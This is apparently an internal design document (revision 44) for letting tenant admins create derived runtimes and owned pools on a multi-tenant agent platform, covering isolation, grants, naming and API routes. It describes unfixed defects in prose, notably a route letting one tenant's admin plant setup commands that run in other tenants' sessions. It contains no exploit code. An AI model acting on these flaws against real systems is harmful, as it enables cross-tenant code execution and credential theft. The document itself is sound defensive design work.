# Tenant-derived runtimes

Status: design for owner review, revision 44, 2026-11-05. Revision 44 adds DR-12, which puts every repository in a subfolder of `current/` and adds `workingDirectory`, after the owner's settling of decision 19. Revision 43 records the warm clone spike under "Not verified". Revision 42 records the owner's settling of decisions 18, 21, and 23. Revision 41 records the owner's settling of decisions 14 and 15 with their additions. Revision 40 records the owner's settling of decision 13. Revision 39 corrects the reason for `ownedOverlays`, because the egress design's allowlist already excludes the variables it named. Revision 38 records the owner's settling of decisions 9 to 12. Revision 36 replaces the `recycle` and `concurrency` forbid values with `reusedPods`, which requires `oneSessionPerPod: true`. That replaces the rules of revisions 32 to 35. A check on revision 36 found no route from a `true` row to a reusing policy and one Major, a resume on a suspended runtime, which the document now states as a residual. Revision 32 applies the review of revision 31, which makes `oneSessionPerPod` one-way and folds `reuseLocked` into it. Revision 31 records the owner's settling of decisions 1 to 8 and adds decision 28, which replaces the tenant's concurrency and recycling fields with `oneSessionPerPod`. It also names DF-17. Revision 28 follows the owner's merge of derive and replay into one route, in `session-derive-design.md`, which replaces `session-replay-design.md`, and shortens DR-9's "Derive". Revisions 21 to 26 apply the stop checks on revisions 20 to 25. A stop check on revision 26 found no Critical, High, or Major issue in DR-9, and revision 27 applies its Minors. Revision 20 applies the review of revision 19 and of `session-replay-design.md` revision 1. Revision 19 applies the owner's decisions on warm clones on reused pods and on derive, and moves replay to `session-replay-design.md`. Revision 18 applies the stop check on revision 17. Revision 17 applies the stop check on revision 16 and removes the warm list generation. Revision 16 applies the stop check on revision 15 and simplifies warm clones. Revision 15 applies the review of revision 14, under "Review of DR-9 and DR-10". Revision 14 adds warm clones and the write scope of default clones to DR-9, records how this design relates to draft proposal 0111, and states the recommended rule for derive and replay, which the owner has not settled. Revisions 9 to 13 apply the review of revision 8 and the stop checks on revisions 9 to 12, under "Review of DR-9 and DR-10". Revision 8 adds default git clones (DR-9) and capacity reservation (DR-10), records the owner's yes on default setup commands, and applies the requests under "Changes requested of other design documents". Revision 7 records the owner's choice of this design. Nothing here is built or staged, and no test or spike was run for it. Statements about the tree were checked by reading the code, the chart, the migrations, and the specification. Revisions 2 to 6 apply independent reviews, each under its own "Review of revision" section. A stop check on revision 5 found no Critical, High, or Major issue in this document, and no review has read revisions 6, 7, or 30. It reads against `egress-and-git-design.md` revision 59, `tenant-scoping-identity-design.md` revision 23, `security-oversight-design.md` revision 26, `user-credential-delivery-design.md` revision 15, and `user-git-identity-design.md` revision 20. Proposals carry the label DR-n, and defects found here carry the label DF-n. The DF-n defects are filed in `BUILD-GAPS.md`, and the table under "Defects found while verifying" names each F-id.

## Problem

§15.1 **REST API** reserves `POST /v1/admin/runtimes` and `POST /v1/admin/pools` to `platform-admin`. A `tenant-admin` can only update records granted to its tenant. The owner wants a tenant admin able to create derived runtimes.

The immediate need comes from `tenant-scoping-identity-design.md`, "Pods with no per-session policy", and its decision 15. Concurrent and service-mode pods refuse a session whose environment has anything of its own, so an environment that needs such a runtime uses a derived runtime with `oneSessionPerPod: true`. Today each such environment needs an operator's action, and the route does not work even for an operator (see "Current state").

The capability is general. A tenant admin can also add default workspace files, setup commands, an agent interface, labels, and narrower limits to a runtime the platform has made available.

## Owner's choice

On 2026-11-04 the owner chose this design over a tenant-owned pool on an unchanged base, in these words: "I want derived runtimes for the two reasons you state. I want tenants to define their own default files and git clones." The two reasons are that transparent clients of a shared runtime keep working when an environment adds a deny, and that a tenant admin creates runtimes. The alternative stays in git history as `designs/tenant-owned-pools-design.md`, revision 5, at commit `7a72e0b65`.

The owner then answered "Default clones: yes" and "Default setup commands: yes", and added: "I think we need to add settings to control the min number of pods per tenant to reserve capacity. This should only be allowed if the platform admin/operator allow it". DR-9 and DR-10 state the clones and the reservation, and "Tenant defaults" states the commands.

On warming, the owner asked for "warming up the clone ahead of time", and then confirmed that draft proposal 0111 is what that meant: "This design should build on top of 0111, or replace 0111 where it makes sense. Add a note to the design doc for the record". "Warm clones" states the design and "Relationship to draft proposal 0111" holds that note. On the write scope of a default clone, the owner observed that "the client may not know what the repo is called, since it's not declared in the session but the pool", and then accepted the recommended `write` field. On derive, the owner wrote: "ideally we pick up the exact state in which the source session was", and "Whether the repo is read-only or write-only should be irrelevant. I don't think we should provide `defaultCloneCommits` as an option in the derive or replay APIs." The owner then merged derive and replay into one route with two modes, which `session-derive-design.md` states.

## Scope

This design covers tenant-created derived runtimes, the pools they need, the grant that turns the capability on, the fields a tenant can set, default git clones, capacity reservation, the base runtime lifecycle, and the interactions with environments, experiments, delegation, and security oversight.

These are out of scope:

- A tenant registering its own image or a standalone runtime.
- Sharing a tenant-derived runtime with another tenant, or deriving from one.
- A route to per-session policy for a service-mode runtime. A derived runtime cannot change `executionMode`, so the rule in `tenant-scoping-identity-design.md` stands for that runtime, and its environment needs a `platform-admin` to register a session-mode runtime of the same image.
- Egress ceilings, overlays, and per-class gates, which `egress-and-git-design.md` owns. Security roles and the tenant security record, which `security-oversight-design.md` owns. Environment scoping, which `tenant-scoping-identity-design.md` owns.

## Requirements

- R1. A `tenant-admin` holding the platform's grant can create, update, and delete a derived runtime of a base the grant names, with no `platform-admin` action per runtime.
- R2. A tenant admin can give an environment one-session pods of a runtime whose shared pool serves concurrent sessions.
- R3. Another tenant cannot see, name, use, collide with, or be affected by a tenant-derived runtime.
- R4. Nothing a tenant sets widens what the base and the platform allow: image, process, isolation, execution mode, egress ceiling, credential delivery, or command policy.
- R5. The platform bounds the pods each tenant's derived runtimes hold, warm and active, and those bounds sum to no more than a deployment total the operator sets. Nodes and the namespace `ResourceQuota` stay shared with every other pool, so R5 limits what owned pools take and reserves nothing. R10 states reservation.
- R6. A tenant-derived runtime blocks no platform write, apart from the exceptions DP9 states, and a platform change does not strand a tenant without notice, apart from a stated emergency path.
- R7. A tenant's security team can forbid the capability and can see what it produced.
- R8. A deployment that issues no grant behaves as it does today, apart from the defect fixes in DR-1 to DR-3.
- R9. A tenant admin can define default workspace files, setup commands, and git clones on a derived runtime, each under its own grant flag. A default clone can be warmed ahead of time on warm pods, and it can give a session push access to its repository with no repository name from the client.
- R10. Where the operator and the platform admin allow it, a tenant admin can reserve a minimum number of pods for a derived runtime. The pods exist before any session, other pools cannot take their share of the namespace quota, and with a dedicated node pool other pools cannot take their nodes. No reservation evicts another pod.

## Security properties

- DP1. A tenant-derived runtime's owner comes from the authenticated principal at create and never changes. No request field sets it.
- DP2. A tenant-derived runtime's row is readable only in a transaction carrying its tenant's context or the platform's all-tenants context. A query with no tenant context cannot see it.
- DP3. Every session path resolves a runtime name within the session's tenant, through an interface that cannot read another tenant's row. A tenant-view miss on the final row refuses the request, on any name, with one answer for an absent name and another tenant's name.
- DP4. A pod of an owned pool serves only the owner, from its creation to its end.
- DP5. The image, process, isolation profile, execution mode, credential delivery mode, and egress ceiling of an owned pool's pods come from platform-written records.
- DP6. A tenant default, file or command, is treated as code execution at the agent UID. It is accepted only on a base whose setup runs at that UID, so neither a tenant command nor a base command reading a tenant file runs with the adapter's identity. A command also passes the base's `setupCommandPolicy`, with `shell: false`.
- DP7. Budgets are platform-held. A tenant has no write path to its own grant.
- DP8. The capability adds no Kubernetes permission to the gateway, and no tenant input reaches a cluster-scoped resource.
- DP9. A platform write to a base or a template pool succeeds regardless of what tenant-derived runtimes exist. The exceptions are `DELETE .../tenant-access/{tenantId}` and a template's `DELETE`, which the operator's own live grant entry refuses, and a base's `DELETE` before its retirement date, which an emergency retirement gets past.
- DP10. Each write passes through EG-9's single write path, applies any SO-2 guardrail, and records the content it changes.
- DP11. An experiment's effects reach a pool only when the experiment's tenant is that pool's single tenant.
- DP12. A default clone stores no credential. Its token comes from the tenant's VCS pool or the session user's link, under the checks a client's `gitClone` source gets, and those checks run on every path that composes it.
- DP13. A reservation never evicts a pod, and the total reservable capacity is set only through Helm.
- DP14. A warm store holds only repositories that the runtime's default clones name, and a session reaches one only after passing that repository's checks. On a pool that reuses pods, a repository later removed from the runtime stays readable on occupied pods until they retire, as "Who reaches a store" states.
- DP15. A default clone adds a repository to a session's writable set only under a stated `write` value. A value that needs no client statement also needs a platform grant and confines pushes to a named ref namespace, and a delegated child never gets write access its parent lacks.

## Current state

Each row was checked against the named source.

| Claim | Status | Source |
| :-- | :-- | :-- |
| Runtime and pool records carry no `tenant_id` and no row-level security | True. `runtime_definitions` and `sandbox_warm_pools` key on `name`, and the store runs plain queries with no tenant context. | §4.2 **Multi-tenancy:**, migrations `0001` and `0033`, `runtimestore/pgstore` |
| `tenant-admin` cannot create | True. Create, delete, and tenant-access routes use `requireAdmin`. | `externalapi/admin/routes.go` |
| A `tenant-admin` update on a granted record reaches other tenants | True, for runtimes and pools. See "Shared records today" and DF-1. | `requireResourceManage`, `applyRuntimeUpdate`, `applyPoolUpdateMerge`, F-5.2.67 |
| `runtime_tenant_access` gates runtime use | False. Only the admin routes and one internal metadata route read it. Session create, discovery, and delegation do not. See DF-2. | `tenantReachesRuntime`, `requireEnvironmentAdmission`, `filterRuntimesByEnvironment` |
| A pool on a derived runtime produces pods | False, from reading the code. See DF-3. | `createPod` in `pkg/controller/sandbox/controller.go` |
| A derived runtime with no pool falls back to the base's pool | False. §5.1 states it, and `ResolvePool` matches `tmpl.Spec.RuntimeRef` exactly. See DF-5. | `podsession/resolve.go` |
| A derived runtime's `sessionPolicy` sets its pods' concurrency | False. Concurrency, recycling, and cleanup come from the pool row. Only `maxClientIdleSeconds` is read from the runtime. See DF-6. | `poolPolicyMirror`, `PoolStoreSource.toConfig`, `sessionidle.go`, `envelope.go` |
| A runtime's default setup commands are checked against its policy | False, by specification. They are exempt from `setupCommandPolicy`. | §7.5 **Command policy:**, `enforceSetupCommandPolicy` |
| Setup commands run in the runtime container | False on a sidecar pod. `RunSetup` execs them in the adapter process's container. See DF-4. | `pkg/adapter/staging.go`, `pkg/adapter/workspace/setup.go` |
| Restrict-only merge rules hold | In part. Providers, recursion, and schema property names are checked. `setupCommandPolicy` and `delegationPolicyRef` are not. See DF-7. | `validateDerivedRuntime`, `Merge` |
| A base change that invalidates a derived runtime is refused | True for `supportedProviders`, `allowSelfRecursion`, `runtimeOptionsSchema`, and the setup timeout pairing, with `BASE_RUNTIME_MUTATION_INVALIDATES_DERIVED` and the names of the affected runtimes. | `derivedRuntimesInvalidatedBy` |
| Deleting a runtime checks dependents | False, against §15.1's deletion rule. See DF-8. | `handleDeleteRuntime` |
| An experiment acts only on its own tenant's pools | False. The controller applies experiment effects to any named pool. See DF-9. | `ExperimentVariantSource.ListPoolConfigs`, `ResolveVariantRoles`, `requireTenantResourceAdmin` |
| Pool ownership exists | False. `ownerTenantId` appears only in `egress-and-git-design.md`, which cites draft 0111. That draft is on the branch `draft/0111-warm-workspace` and is absent from `proposals/` on this branch. | Search of `pkg/`, `spec/`, `migrations/`, `charts/`, and `proposals/` |
| The gateway can write pool CRDs | False. It holds `get`, `list`, and `watch` on `sandboxwarmpools`, `sandboxtemplates`, and `runtimes`. The PoolScalingController holds `create`, `update`, and `delete` on the first two. | `gateway-deployment.yaml`, `pool-scaling-controller-rbac.yaml` |
| A precedent for moving a registry to tenant scope exists | True. Migration `0054` gave `delegation_policies` a `tenant_id`, `lenny_tenant_guard`, and `lenny_tenant_isolation`. | `migrations/0054_delegation_policies_tenant_scoped.up.sql` |

### Shared records today

A `tenant-admin` updating a granted platform-global record affects every other tenant holding a grant on it.

`PUT /v1/admin/runtimes/{name}` checks only that the caller's tenant holds a grant. `applyRuntimeUpdate` then writes `workspaceDefaults`, `labels`, `setupCommandPolicy`, `delegationPolicyRef`, `publishedMetadata`, `sessionPolicy`, `limits`, `isolationProfile`, `executionMode`, and `capabilities`. `runtimes.go` contains no role check. §14.1 **Runtime workspace defaults.** composes the runtime's `workspaceDefaults` into every session's plan, and §7.5 **Command policy:** exempts those commands from `setupCommandPolicy`. An administrator of tenant `acme` can therefore place a command that runs in a session of tenant `globex`. The RuntimeReconciler rewrites the CRD-owned fields at its next reconcile, and its field list omits `workspaceDefaults`, `publishedMetadata`, `sessionPolicy`, and `sharedAssets`, so those writes persist on a CRD-registered runtime too.

The pool routes have the same gate. F-5.2.67 records the egress case. The same gate also lets one tenant re-point `runtimeRef`, change `isolationProfile`, set the warm count, and drain a shared pool, which refuses new sessions for every tenant on it.

### Not verified

- How a §10.5 upgrade's new image reaches pods was not established. `SandboxTemplateSpec` has `runtimeRef` and no image, and the upgrade store holds `NewImage`. DR-5 therefore leaves open how owned pools follow a base upgrade, and whether each owned pool needs its own upgrade run. An owned pod takes the base's `Runtime` resource at creation under this design.
- DF-3 rests on a search for any path that creates a `Runtime` resource for an admin-registered runtime. The search found none, and no pod was started to confirm it.
- Who creates the Kubernetes Service a service-mode pool routes through was not established. Decision 10 does not depend on it.
- Whether billing reads warm-pod minutes per pool was not read.
- What the projected service account token can do at the gateway was not traced, so DF-4's rating is a floor.
- What `messages.go` does on a not-found answer from its runtime read was not traced. The type change under "Reading" covers it either way.
- The tree was read at commit `a575d5718`, and the design documents as they stand in the working tree.

## Costs of the capability

The owner has decided to have this capability. These are its costs.

- **Tenant code in every session.** Any tenant default is code execution at the agent UID, in every session on that runtime, and the user creating the session has no opt-out. A default file is code as well as a command: a base command installs from it, and a runtime loads a hook or configuration file from the workspace. A stolen `tenant-admin` therefore reaches what `user-credential-delivery-design.md` lists for this attacker: it reads a `file` token and uses an `inject` token, including a host's mint operation. It also reads what later sessions place in the workspace. A grant with `allowWorkspaceFiles`, `allowSetupCommands`, and `allowGitClones` off carries none of this cost and still serves R2. DF-1 is worse than this today, because it crosses tenants, and DR-1 closes it. Within a tenant the risk is new.
- **Warm pods per runtime.** Each tenant-derived runtime has its own pool and at least one warm pod, because a pool has no working cold path today (DF-11). An environment moved from a concurrent pod to one-session pods also uses more pods per session.
- **Capacity planned by customers.** §17.8.2's sizing assumes an operator's pool list. Tenant writes now add pools within the budgets, and the namespace `ResourceQuota` is shared.
- **Slower base retirement.** A base with tenant-derived runtimes takes a notice period to retire, apart from the emergency path, and a platform change reaches runtimes the operator did not write.
- **A wider read path.** Every session-path read of a runtime changes to take a tenant, across `pkg/gateway/sessionserver`, `pkg/gateway/mcpfabric`, `pkg/gateway/session`, and `cmd/lenny-gateway`, and each holder of the plain store changes type. The compiler finds those sites. Many of them continue on a not-found answer today, so the change is needed for correctness as well as isolation (see "Reading").
- **Operating load.** Tenant-chosen runtime and pool names appear in operator logs and in metric labels, which raises label cardinality, and an operator debugging a failed pod now reads tenant configuration.
- **Prerequisite work.** DR-1, DR-2, and DR-3 close defects this capability cannot rest on. DF-3 and DF-5 mean no derived runtime runs a session today, so decision 15's route needs DR-2 whoever creates the runtime.

## DR-1 to DR-3: Prerequisites

**DR-1, the shared-record boundary.** R3 and R4 need a base that no tenant can change. A `tenant-admin` loses every write on a platform-global runtime or pool, including the pool's `warm-count`, `drain`, `circuit-breaker`, `bootstrap-override`, and `resume-reconciliation` routes. `PermManageRuntimes` and `PermManagePools` leave `RolePermissions(RoleTenantAdmin)`, which is what `TenantAdminPermissions()` returns and what the custom-role ceiling reads, so a custom role cannot hold them either. `AllPermissions()` keeps them for `platform-admin`. Reads stay. EG-9's tenant pool overlay remains the path for egress and git settings, and a derived runtime is the path for the rest. DR-1 also moves session create, discovery, and delegation to read `runtime_tenant_access`, and reserves the `--` name form. On an unpinned resolution, a pool with a store row and no owner needs a `pool_tenant_access` row, an owned pool checks its owner, and a CRD-only pool such as `echo-pool-embedded` is exempt, because the foreign key on `pool_tenant_access` refuses it. A soft-deleted row counts as a store row, and a read error refuses. A miss answers as no matching pool. The check runs only where a create, derive, replay, or child placement claims a pod, so a revocation does not fail `/start` for a session already holding a claim or lose slot accounting in `startOnPod`, `launchOnPod`, `resumeOnPod`, and `accountFailedSlot`.

Those reads refuse every session on a fresh install unless the seed grants access, and it does not (DF-14). DR-1 therefore implements §17.6's `tenantAccess` on seeded runtimes and pools. An absent `tenantAccess` grants `default` when the seed names no tenant, the seed's tenant when it names exactly one, and none when it names several (decision 15). The `lenny-bootstrap` Job also runs post-upgrade, so a list or default applies only when the seed creates the row, as §17.6's "left unchanged" states, which keeps `helm upgrade` from undoing a revocation. `--force-update` adds the tenants of a listed `tenantAccess`, removes no grant, and never applies the default. A seed naming several tenants that leaves a runtime or pool with no access logs a `WARN` naming it, because a session there otherwise reports only that no pool matches.

DR-1 also closes the experiment path (DF-9), under one rule: a pool's single tenant is its owner, or else the only tenant with a `pool_tenant_access` row.

- A `tenant-admin` writing an experiment can name as `variant.Pool` only a pool its tenant owns, and as `variant.Runtime` only a runtime its tenant can reach, on `POST` and `PUT`. Any other name answers as unknown. Until DR-5 lands no pool qualifies, so such an experiment sets `variant.Runtime` alone.
- `handlePatchExperiment` takes status alone, so a status change on a stored experiment naming a non-owned pool requires `platform-admin`, and so does a `PUT`, which could otherwise drop the pool first. A `tenant-admin` cannot pause or conclude what a `platform-admin` set up on a platform pool.
- A `platform-admin` can name a platform pool whose single tenant is the experiment's tenant.
- `ExperimentVariantSource` applies `PoolVariant`, `InitialMinWarm`, `ForceZeroMinWarm`, and `DrainAndDelete` only to a pool whose single tenant is the experiment's tenant, and it applies the base-pool reduction under the same test. A base pool shared with another tenant is skipped, as `PoolStoreBasePoolResolver` already skips an ambiguous pool, so it stays somewhat over-warmed. Adding a second grant ends the effects on that pool.
- `ResolveVariantRoles` runs per tenant, so a malformed set drops that tenant's variants alone.

**DR-2, pods for derived runtimes.** `podRuntimeRef` is under "Pods". §5.1 changes to state that a derived runtime needs its own pool, removes the fallback sentence, and states that `sessionPolicy` on a derived runtime supplies the values of its pool. A platform-created derived runtime follows the same rule, so this fixes decision 15's route for an operator on its own.

**DR-3, setup command identity.** On a sidecar pod the adapter asks the runtime supervisor over `CH-SUPERVISE` to run each setup command in a forked worker at the agent UID, as §4.7.10 **Runtime supervisor.** **Cleanup.** states for `cleanupCommands`. Commands then run from the runtime image, with the agent's access. A client's commands get the same change. A pod with no supervisor keeps today's behaviour for operator-written and client commands, and a tenant default is refused on such a base. DR-3's claim is limited to the adapter's identity: the token and the writable volume go out of reach. On a concurrent pod the agent UID can still read every slot's credential file, which §13.1 **Per-slot credential-read scope** states, so DR-3 does not close that read.

## DR-4: Tenant runtime records

### Options

| Option | Result |
| :-- | :-- |
| A nullable `owner_tenant_id` on `runtime_definitions` | Existing reads keep working unchanged, and each one would return another tenant's row unless it adds a check. DF-2 shows how application-layer filtering on this record has fared. It also fails `lenny_tenant_guard` and §12.3's R-01. |
| A composite key `(tenant_id, name)` on one table | It rewrites the table, its foreign keys, and the platform rows, and it leaves two tenants with one name, which conflicts with the pod label, the CRD names, and pool lookup by name. |
| **A separate tenant-scoped table, with a reserved name prefix per tenant (recommended)** | A query with no tenant context cannot see a tenant row, so a missed read leaks nothing. "Reading" states why that alone is not enough. Every name stays globally unique, so session rows, pod labels, CRDs, and metrics keep one string. |

### Stored format

`tenant_runtime_definitions` holds the columns of `runtime_definitions` plus `tenant_id`, with `(tenant_id, name)` as primary key and a unique index on `name`. It takes `lenny_tenant_guard` and `lenny_tenant_isolation`, as migration `0054` did for delegation policies, so §4.2's statement that a missing WHERE clause cannot break isolation holds. Reads go through `pgtenant.InTx` with the tenant, and platform reads go through `pgtenant.InAllTenants`. §4.2's classification table gains a tenant-scoped row, and the platform-global row stays for platform records. §12.8 erasure gains this table, the grant, and owned pools. See "Tenant suspension and deletion".

### Names

The platform assigns each granted tenant a `namePrefix`, unique across tenants and immutable once the tenant has a row. A tenant-derived runtime is named `<namePrefix>--<suffix>`, such as `acme--chat-payments`.

- A prefix matches `^[a-z0-9]+(-[a-z0-9]+)*$`, so it holds no `--` and does not end in `-`. A name therefore has one prefix, read up to its first `--`. Without this, `a--b--x` fits the prefixes `a` and `a--b`.
- `consumed_name_prefixes` records each prefix when first assigned, and neither withdrawal nor erasure removes it, so a later tenant cannot take a name that retained records still carry.
- `--` becomes reserved. The admin API, the bootstrap seed, and the RuntimeReconciler refuse a platform runtime or pool name containing it. Nothing is deployed, so nothing migrates.
- A tenant's write naming another prefix is refused with `422 INVALID_DERIVED_RUNTIME`, so `RESOURCE_ALREADY_EXISTS` can only report the tenant's own name and is no oracle.
- The whole name is at most 63 characters, because `createPod` copies it to the `lenny.dev/runtime` pod label (DF-10).
- A deleted name stays consumed, as `egress-and-git-design.md` states for pools, and only the tenant's own names are consumed. Creates are rate-limited, and soft-deleted rows count toward a separate bound.

### Reading

`runtimestore` gains a tenant view, `Resolve(ctx, tenantID, name)` and `List(ctx, tenantID)`. A name containing `--` reads only the tenant table, in that tenant's context. Any other name reads the platform table and requires a `runtime_tenant_access` row. `List` returns granted platform rows plus the tenant's own rows. It also evaluates the grant entry on each resolve (see "Base changes"). This is also what closes DF-2.

Row-level security stops a leak and does not stop a wrong answer. A tenant-derived name read through the platform store returns `ErrNotFound`, and many sites continue on that answer: `runtimeSetupPolicy` in `bind_request.go` keeps `shell` true, which loses `setupCommandPolicy.shell: false`; `enforceSetupCommandPolicy` and §14.1 **Runtime workspace defaults.** rule 4 bind the plan unchecked with no defaults; `requireExplicitEnvironmentAdmission` leaves the name to later checks; and the limits, idle, content-policy, and manifest reads in `envelope.go`, `sessionage`, `sessionidle`, `delegation/service.go`, and `mcptools_register.go` fall back to defaults. These rules follow.

- `Server`, `mcptools.Deps`, the delegation service, the session resolvers, and `credentialsurface.go` in `cmd/lenny-gateway` hold the tenant-view interface and no plain `Store`, so a missed site does not compile. `runtimecapoverride.ResolveForTenant` takes the view as well.
- `Store.Get` on a name containing `--` returns `ErrTenantScopedName`, distinct from `ErrNotFound`, and no path continues on it.
- A tenant-view miss on the final row refuses the request, on any name, at create, derive, and a delegated child's placement, after any experiment or `PreRoute` rewrite. `ResolvePool` reads no runtime store, so without this a revoked grant still lands sessions. The answer is `RESOURCE_NOT_FOUND`, or the surface's own not-found answer, for an absent name and for another tenant's name. §14.1 rule 4 does not apply where the tenant view is wired. On a create this check runs first, because `requireAdmissionRateLimit` calls `ResolvePool` before any runtime read.

`GET /v1/runtimes/{name}/meta/{key}` has no principal, so a `--` name always answers not found there.

`Router` holds the tenant view too, and its plain `Store` moves to a field that only `requireAdmin` routes use. A handler only `platform-admin` reaches reads a view seeing both tables, through `pgtenant.InAllTenants`, wherever it reads a pool's runtime. Without that, `validatePoolUpdate` answers `400` for an owned pool on every `PUT` and on `warm-count`, which delegates to it, and `poolIsSDKWarm` and `runtimeRestartable` read false.

A handler a `tenant-admin` reaches reads the tenant view for one tenant and never the all-tenants view. These are `delegationPolicyRuntimeDependents`, `handleEnvironmentRuntimeExposure`, `environmentDryRunPreview`, `validatePoolProxyDialect`, `checkVariantIsolation`, and the capability override `PUT`, which otherwise answers `404` for the tenant's own derived runtime. Two of them need more than a type change:

- The policy guard takes the policy's tenant. Migration `0054` keys policies on `(tenant_id, name)`, so names collide across tenants. Read across tenants, a `globex` admin deleting `strict` would get `409` naming `acme--chat-payments`, and `acme` would block that delete (DF-13).
- `checkVariantIsolation` returns nil on any read error, so a `--` base would skip the admission check. A miss on the tenant view refuses the write.

### API

| Route | Caller | Behaviour |
| :-- | :-- | :-- |
| `PUT /v1/admin/tenants/{id}/derivation-grant` | `platform-admin` | Creates or replaces the grant. Mirrored to the tenant's chain under SO-4a. |
| `GET /v1/admin/tenants/{id}/derivation-grant` | `platform-admin`, and `tenant-admin` for its own | Returns the grant and current use. |
| `POST /v1/admin/derived-runtimes` | `manage_derived_runtimes` | Creates the runtime and its owned pool in one transaction. |
| `GET /v1/admin/derived-runtimes[/{name}]` | The same permission, `tenant-viewer`, and `platform-admin` with `?tenant_id=` | Returns the declared fields, the effective runtime, `ownerTenantId`, `baseStatus`, and `poolStatus`. |
| `PUT /v1/admin/derived-runtimes/{name}` | `manage_derived_runtimes` | Requires `If-Match`, and takes the same body. `name` and `baseRuntime` are immutable. |
| `POST /v1/admin/derived-runtimes/{name}/drain` | `manage_derived_runtimes` | Drains the owned pool, so its new sessions stop. |
| `DELETE /v1/admin/derived-runtimes/{name}` | `manage_derived_runtimes` | Checks dependents first. It answers `409 RESOURCE_HAS_DEPENDENTS` and changes nothing while non-terminal sessions remain, as §15.1's deletion rule states, and otherwise removes the runtime and pool. |

New routes keep `requireAdmin` on `POST /v1/admin/runtimes` untouched and give the request its own schema. The body decodes with unknown fields refused, because the existing handlers silently drop them, and a refused field must not read as accepted. `runtimeRef` and `AuthorizedRuntime` do not change on the wire. `manage_derived_runtimes` is a new named permission that `tenant-admin` holds, and a custom role can hold it under §10.2's ceiling. An environment `admin` does not hold it, in line with `tenant-scoping-identity-design.md` decision 7.

New error codes are `403 DERIVATION_NOT_GRANTED`, `422 DERIVATION_BUDGET_EXCEEDED`, and `409 DERIVED_RUNTIME_UNAVAILABLE`, whose `details.reason` names the base state below. Field refusals reuse `INVALID_DERIVED_RUNTIME` with `details.field`. Writes use EG-9's write path, which applies `GUARDRAIL_VIOLATION`.

### Stored formats and wire contracts this forces

| Item | Change | Proposal |
| :-- | :-- | :-- |
| `tenant_runtime_definitions` | New table, with EG-9's nullable `suspended_by` | DR-4 |
| `tenant_derivation_grants` | New table, with one row per tenant, readable under the tenant's context, and written only under `lenny.admin_mode`, using the trigger migration `0052` introduced | DR-4 |
| `consumed_name_prefixes` | New table, holding the prefix string alone, written at first assignment, and surviving withdrawal and erasure | DR-4 |
| `runtime_definitions` | `retire_at`, in DR-6, and `deployment_model` and `registered`, which the RuntimeReconciler mirrors, in DR-4 | DR-4 and DR-6 |
| `sandbox_warm_pools` | `owner_tenant_id` from EG-9, plus `template_pool`, `pod_runtime_ref`, and `warm_stop_reasons`, and `reserved_pods` and `reserved_placement` | DR-2, DR-5, DR-10 |
| `SandboxTemplate.spec` | `podRuntimeRef` and the owner, because the controller stamps the owner from it, and `reservedPlacement` | DR-2, DR-5, DR-10 |
| `SandboxWarmPool.spec` | `reservedPods`, which the PoolScalingController renders from the pool row | DR-10 |
| `Sandbox.spec` | `reserved`, set at creation | DR-10 |
| `workspaceDefaults` | `gitClones`, with `warm` and `write` | DR-9 and DR-11 |
| `gitClone` and `inlineFile` sources | `runtimeDefault`, gateway-written and refused from a client, in the stored plan, `schemas/workspaceplan-v1.json` under `additionalProperties: false`, `WorkspaceSource` in `lenny-adapter.proto`, and the mapping in `podsession/workspaceplan.go`, which would otherwise drop them silently | DR-9 |
| `WorkspacePlan` | `writeDefaultClones` from a client, and `readOnlyDefaultClones`, gateway-written, through the same carriers | DR-9 |
| Session row and setup commands | `derivedFrom`, `snapshotIsOwn`, `planOriginRuntimes`, and a command's `origin`, under `session-derive-design.md` | SD-1 |
| `content_stop_epochs` | Tenant-keyed counters outside the grant and the security record, under "Stops" in `session-derive-design.md` | DR-4 and DR-7 |
| `FinalizeWorkspace` and `Resume` | The URLs a restore completion may fetch | DR-11 |
| Claim request | `coveredStores` | DR-11 |
| Owned pool row, `SandboxTemplate.spec`, and `Sandbox` | `warm_clone_bytes` and `one_session_per_pod`. `warmClones` and `warmCloneBytes`. `warmStores` and the `lenny.dev/owner-tenant` label | DR-5, DR-9, and DR-11 |
| Chart | The `lenny-reserved` `PriorityClass`, and the `ResourceQuota` split into reserved, general, and storage quotas | DR-10 |
| Base-change outbox | A row written in the platform write's transaction | DR-6 |
| Pod label | `lenny.dev/served`, under `lenny-label-immutability` | DR-5 |
| Name grammar | `--` reserved | DR-1 |
| §15.1 | The routes and codes above | DR-4, DR-6 |

## Who turns it on

The capability needs a grant per tenant, in the form of EG-9's per-class gates, with parameters. The class is `tenantDerivedRuntimes`, and a tenant with no grant answers `403 DERIVATION_NOT_GRANTED`. A Helm value, `runtimes.tenantDerivation.enabled`, is false by default. While false it refuses a new grant, any write that raises a limit or adds a base, flag, or overlay, and `POST /v1/admin/derived-runtimes`. A withdrawal or a narrowing still passes, and existing runtimes keep resolving, so turning it off stops new use and is not an emergency stop.

```yaml
# PUT /v1/admin/tenants/{id}/derivation-grant
namePrefix: acme
maxRuntimes: 10
maxOwnedPods: 20
bases:
  - baseRuntime: chat
    templatePool: chat-shared
    resourceClasses: [small, medium]
    allowWorkspaceFiles: false
    allowSetupCommands: false
    allowGitClones: false
    allowGitCloneWrites: false
    maxWarmCloneBytes: 0
    maxReservedPods: {}
    ownedOverlays: []
```

A base entry is accepted only when all of these hold:

- The base is a standalone runtime with `executionMode: session`.
- The tenant holds `runtime_tenant_access` on it.
- `templatePool` is a platform pool backed by the base, and the tenant holds `pool_tenant_access` on it.
- `resourceClasses` lies within the base's `allowedResourceClasses`.
- The base has `requireSoPeercred` true, because `acknowledgeNonceOnlyAuth` is a deployer's statement that a tenant does not make.
- The base's `Runtime` resource exists, which the gateway's `get` permission reads, because a pool's pods need it (DF-3).
- With `allowWorkspaceFiles`, `allowSetupCommands`, or `allowGitClones` set, the base is `type: agent` with `deploymentModel` `sidecar` or empty, which `runsSupervisor` reads as sidecar, so it runs the runtime supervisor.
- With `allowSetupCommands` set, the base's `setupCommandPolicy` has mode `allowlist` and `shell: false`.
- With `allowGitCloneWrites` set or `maxWarmCloneBytes` above zero, `allowGitClones` is set.
- With `maxWarmCloneBytes` above zero, the value is at or below `runtimes.tenantDerivation.warmClones.maxBytesPerPod` and the template's fetch size cap, and the base carries no private `gitRepository` entry, because this design gives no tenant a store it did not name.

A base outside the list cannot be derived from, and "Base changes" states what each grant change does. A grant or a withdrawal is a platform admin's write to a customer's configuration, so SO-4a mirrors it, as for the other gates.

## Fields

Each row follows §5.1 **Normative Merge Algorithm**. Rows marked "not in §5.1" appear in `Merge` or the payload and are absent from the table (DF-12). "Narrow" means the value is checked against the base at write and evaluated against the live base at resolve, as "Base changes" states.

| Field | Merge rule | Tenant | Rule and reason |
| :-- | :-- | :-- | :-- |
